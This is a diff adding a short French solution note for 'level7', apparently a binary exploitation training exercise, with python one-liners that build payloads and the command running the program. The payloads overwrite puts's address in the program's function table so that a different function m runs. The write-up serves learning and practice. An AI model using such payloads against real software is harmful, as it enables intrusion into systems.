@@ -1,0 +1,15 @@
+ABCDEFGHIJKLMNOPQRST
+
+on trouve l overwrite du premier strcpy et c 20
+
+on recuperre l adresse de puts avec x/i 0x08048400 (avec gdb on la)
+
+on va injecter l adresse de puts ds le premier arg au 21eme octet et l adresse de m ds le deuxieme arg
+pour afficher la phrase
+
+python -c 'print "a" * 20 + "\x28\x99\x04\x08"' > /tmp/payload7
+
+python -c 'print "\xf4\x84\x04\x08"' > /tmp/payload7bis
+
+./level7 $(cat /tmp/payload7) $(cat /tmp/payload7bis)
+
